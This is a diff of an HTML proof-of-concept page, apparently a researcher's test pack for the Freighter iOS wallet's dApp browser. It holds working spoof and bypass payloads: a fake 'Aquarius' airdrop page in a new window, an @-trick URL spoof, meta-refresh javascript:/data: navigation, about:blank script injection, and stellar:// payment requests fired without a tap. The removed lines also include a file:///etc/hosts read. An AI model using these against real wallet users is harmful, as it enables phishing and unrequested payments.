@@ -3,87 +3,105 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Freighter iOS Test - 0x403for</title>
+<title>Other Bugs - Freighter iOS - 0x403for</title>
 <style>
-body{font-family:monospace;padding:16px;background:#000;color:#0f0}
-button{padding:12px 16px;margin:8px 0;width:100%;font-size:16px}
-iframe{width:100%;height:300px;border:2px solid #0f0;margin-top:10px}
+body{font-family:monospace;padding:14px;background:#000;color:#0f0}
+button,a.btn{display:block;padding:14px;margin:10px 0;background:#111;border:1px solid #0f0;color:#0f0;text-align:center;text-decoration:none;width:100%;font-size:15px}
+pre{background:#111;padding:8px;overflow:auto;white-space:pre-wrap}
+small{color:#888}
 </style>
 </head>
 <body>
-<h2>Freighter iOS dApp Browser - Test Pack</h2>
-<p>Origin: <span id="origin"></span></p>
+<h2>Other Bugs Test - 0x403for</h2>
+<p id="info"></p>
 
-<h3>1. UI Spoof (yang di screenshot 11.40)</h3>
-<iframe id="spoof" srcdoc="<h1 style='text-align:center'>AQUARIUS<br>Connect Freighter Wallet<br><button>Connect</button></h1><p>Claim 1000 AQUA</p>"></iframe>
+<h3>1. window.open spoof (cek tab count)</h3>
+<button onclick="testWindowOpen()">Test window.open + document.write</button>
+<small>Bug kalau tab baru address bar tetap 0x403for.github.io tapi konten fake aqua.network</small>
 
-<h3>2. pushState Spoof</h3>
-<button onclick="testPushState()">Test pushState -> fake aqua.network</button>
+<h3>2. Auth URL Spoof @ trick</h3>
+<a class="btn" href="https://aqua.network@0x403for.github.io">https://aqua.network@0x403for.github.io</a>
+<button onclick="location.href='https://aqua.network%400x403for.github.io'">Test @ via JS</button>
+<small>Cek address bar Freighter bawah: kalau cuma show aqua.network padahal domain asli 0x403for.github.io = bug</small>
 
-<h3>3. blob: / data: URI Bypass</h3>
-<button onclick="testBlob()">Test blob: navigation</button>
-<button onclick="testData()">Test data: navigation</button>
+<h3>3. Meta Refresh Bypass (bypass 0-click filter)</h3>
+<button onclick="testMetaRefresh('javascript')">Test meta refresh javascript:</button>
+<button onclick="testMetaRefresh('data')">Test meta refresh data:</button>
+<div id="metaBox"></div>
 
-<h3>4. srcdoc UXSS</h3>
-<button onclick="testSrcdoc()">Test srcdoc alert(domain)</button>
-<div id="srcdocBox"></div>
+<h3>4. about:blank UXSS</h3>
+<button onclick="testAboutBlank()">Test about:blank document.write</button>
+<div id="blankBox"></div>
 
-<h3>5. file:// test (safe)</h3>
-<button onclick="testFile()">Test file:// read</button>
-
-<h3>6. webkit.messageHandlers check (iOS specific)</h3>
-<button onclick="testBridge()">Dump window.webkit.messageHandlers</button>
+<h3>5. stellar:// scheme tanpa gesture</h3>
+<a class="btn" href="stellar://pay?destination=GBEVILTEST123&amount=10&memo=Test">Test stellar:// link (tap)</a>
+<button onclick="testStellarIframe()">Test stellar:// via iframe (no tap)</button>
+<button onclick="testStellarLocation()">Test stellar:// via location.href (no tap)</button>
 <pre id="log"></pre>
 
 <script>
-document.getElementById('origin').innerText = location.origin + ' | ' + location.href;
+document.getElementById('info').innerText = 'Origin: ' + location.href + '\nUA: ' + navigator.userAgent;
 const logEl = document.getElementById('log');
-function log(t){ logEl.innerText += t + '\n'; console.log(t); }
+function log(t){ logEl.innerText += t+'\n'; console.log(t); }
 
-function testPushState(){
-  log('Before: ' + location.href);
-  history.pushState({}, '', 'https://aqua.network/airdrop');
-  log('After pushState: ' + location.href + ' - CEK ADDRESS BAR FREIGHTER!');
-  setTimeout(()=>{ history.pushState({}, '', 'https://0x403for.github.io/spoof-pack.html'); log('Restored'); }, 3000);
+function testWindowOpen(){
+  log('Opening new window...');
+  let w = window.open('about:blank');
+  if(!w){ log('Popup blocked'); return; }
+  w.document.write(`
+    <h1 style="font-family:sans-serif;text-align:center">AQUARIUS FAKE<br>Claim 1000 AQUA</h1>
+    <p>This content is from window.open - check if address bar still shows 0x403for.github.io</p>
+    <script>alert('window.open spoof - domain: '+document.domain)</sc${''}ript>
+  `);
+  log('Wrote to new window - check Freighter tab bar & address bar');
 }
 
-function testBlob(){
-  const blob = new Blob(['<h1>Fake via BLOB - if you see this in top frame, bug!</h1><script>alert(document.domain)</sc'+'ript>'], {type:'text/html'});
-  const url = URL.createObjectURL(blob);
-  log('Navigating to blob: ' + url);
-  location.href = url;
+function testMetaRefresh(type){
+  const box = document.getElementById('metaBox');
+  if(type==='javascript'){
+    box.innerHTML = '<meta http-equiv="refresh" content="0; url=javascript:alert(`meta refresh js bypass: ${document.domain}`)">';
+    // For real test need to create actual navigation
+    let html = `<html><head><meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)"></head></html>`;
+    let blob = new Blob([html], {type:'text/html'});
+    location.href = URL.createObjectURL(blob);
+    log('Meta refresh javascript: injected');
+  } else {
+    let payload = btoa('<h1>Fake via meta refresh data:</h1><script>alert(document.domain)</sc'+'ript>');
+    box.innerHTML = `<meta http-equiv="refresh" content="0; url=data:text/html;base64,${payload}">`;
+    location.href = 'data:text/html;base64,'+payload;
+    log('Meta refresh data: injected');
+  }
 }
 
-function testData(){
-  log('Navigating to data:text/html');
-  location.href = 'data:text/html,<h1>Fake via DATA URI - bug if loaded</h1><script>alert(document.domain)</sc'+'ript>';
+function testAboutBlank(){
+  const box = document.getElementById('blankBox');
+  box.innerHTML='';
+  let f = document.createElement('iframe');
+  f.src = 'about:blank';
+  f.style.width='100%'; f.style.height='200px'; f.style.border='1px solid #0f0';
+  box.appendChild(f);
+  setTimeout(()=>{
+    try{
+      f.contentWindow.document.write('<h1>about:blank UXSS</h1><script>alert("about:blank domain: "+document.domain+" | parent: "+parent.document.domain)</sc'+'ript>');
+      log('about:blank written - check alert domain');
+    }catch(e){ log('about:blank blocked: '+e); }
+  },500);
 }
 
-function testSrcdoc(){
-  const box = document.getElementById('srcdocBox');
-  box.innerHTML = '<iframe srcdoc="<script>alert(\'srcdoc XSS - domain: \'+document.domain)</sc'+'ript><h1>srcdoc</h1>"></iframe>';
-  log('srcdoc injected - check alert domain');
+function testStellarIframe(){
+  log('Injecting iframe stellar://pay...');
+  let f = document.createElement('iframe');
+  f.src = 'stellar://pay?destination=GBEVILTEST&amount=1&memo=iframe_test';
+  document.body.appendChild(f);
+  setTimeout(()=>log('If iframe triggers Freighter pay popup without tap = Critical'),1000);
 }
 
-function testFile(){
-  log('Testing file:// fetch...');
-  fetch('file:///etc/hosts').then(r=>r.text()).then(t=>{ log('file:// READ SUCCESS: ' + t.slice(0,100)); }).catch(e=>{ log('file:// blocked (good): ' + e); });
+function testStellarLocation(){
+  log('location.href stellar://pay...');
+  location.href = 'stellar://pay?destination=GBEVILTEST&amount=1&memo=location_test';
 }
 
-function testBridge(){
-  log('--- webkit.messageHandlers ---');
-  try{
-    log(JSON.stringify(Object.keys(window.webkit.messageHandlers || {})));
-    log(JSON.stringify(window.webkit, null, 2).slice(0,1000));
-    // Cek freighter object
-    log('window.freighter: ' + typeof window.freighter);
-    log('window.freighterApi: ' + typeof window.freighterApi);
-  }catch(e){ log('error: '+e); }
-}
-
-// Auto info pas load
-log('Loaded at: ' + new Date().toISOString());
-log('UserAgent: ' + navigator.userAgent);
+log('Ready - loaded at '+new Date().toISOString());
 </script>
 </body>
 </html>
